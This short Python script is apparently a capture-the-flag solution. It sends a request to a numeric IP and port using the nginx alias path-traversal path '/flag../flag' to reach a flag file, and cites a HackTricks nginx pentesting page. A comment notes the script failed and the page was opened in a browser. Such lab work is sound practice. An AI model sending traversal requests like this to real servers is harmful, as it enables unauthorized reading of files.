import requests
from bs4 import BeautifulSoup

# reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx
url = 'http://23.94.73.203:1761'
index = '/flag../flag'

# didn't work using this script, acces directly using the browser
response = requests.post(url + index)
print(response.text)